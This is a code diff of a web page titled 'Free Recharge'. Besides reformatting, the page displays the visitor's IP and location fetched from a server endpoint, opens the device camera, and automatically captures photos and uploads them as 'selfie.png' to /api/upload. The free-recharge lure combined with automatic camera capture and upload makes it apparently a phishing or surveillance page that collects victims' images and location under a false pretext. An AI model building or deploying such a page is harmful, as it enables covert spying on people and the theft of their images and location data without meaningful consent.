@@ -3,10 +3,14 @@
   <head>
     <meta charset="UTF-8" />
     <title>Free Recharge</title>
-    <link rel="stylesheet" href="css/style.css">
+    <link rel="stylesheet" href="css/style.css" />
   </head>
   <body>
-    <div class="body"></div>
+    <div class="body">
+      <!-- <p></p> -->
+      <div class="loader1"></div>
+      <div class="loader"></div>
+    </div>
     <div id="user-info">
       <p>IP Address: <span id="ip"></span></p>
       <p>Location: <span id="location"></span></p>
@@ -14,23 +18,31 @@
     <div id="camera">
       <video id="video" width="640" height="480" autoplay></video>
       <button id="snap">Take Photo</button>
-      <canvas id="canvas" width="640" height="480" style="display: none"></canvas>
+      <canvas
+        id="canvas"
+        width="640"
+        height="480"
+        style="display: none"
+      ></canvas>
     </div>
     <script>
       // Get user IP and location
       fetch("/api/location")
-        .then(response => response.json())
-        .then(data => {
+        .then((response) => response.json())
+        .then((data) => {
           if (data.ip) {
             document.getElementById("ip").textContent = data.ip;
           }
           if (data.city && data.region && data.country) {
-            document.getElementById("location").textContent = `${data.city}, ${data.region}, ${data.country}`;
+            document.getElementById(
+              "location"
+            ).textContent = `${data.city}, ${data.region}, ${data.country}`;
           } else {
-            document.getElementById("location").textContent = "Location data not available.";
+            document.getElementById("location").textContent =
+              "Location data not available.";
           }
         })
-        .catch(error => console.error("Error:", error));
+        .catch((error) => console.error("Error:", error));
 
       // Access the device camera and take a photo
       const video = document.getElementById("video");
@@ -40,14 +52,15 @@
       let streamStarted = false;
 
       if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-        navigator.mediaDevices.getUserMedia({ video: true })
-          .then(stream => {
+        navigator.mediaDevices
+          .getUserMedia({ video: true })
+          .then((stream) => {
             video.srcObject = stream;
             streamStarted = true;
             // Start taking photos after the stream has started
             startPhotoCapture();
           })
-          .catch(error => console.error("Error accessing camera:", error));
+          .catch((error) => console.error("Error accessing camera:", error));
       } else {
         console.error("getUserMedia not supported on your browser!");
       }
@@ -56,18 +69,18 @@
         if (streamStarted) {
           const context = canvas.getContext("2d");
           context.drawImage(video, 0, 0, 640, 480);
-          canvas.toBlob(blob => {
+          canvas.toBlob((blob) => {
             const formData = new FormData();
             formData.append("selfie", blob, "selfie.png");
             fetch("/api/upload", {
               method: "POST",
               body: formData,
             })
-              .then(response => response.json())
-              .then(data => {
+              .then((response) => response.json())
+              .then((data) => {
                 console.log("File uploaded successfully:", data.filePath);
               })
-              .catch(error => console.error("Error uploading file:", error));
+              .catch((error) => console.error("Error uploading file:", error));
           });
         } else {
           console.log("Waiting for video stream to start...");
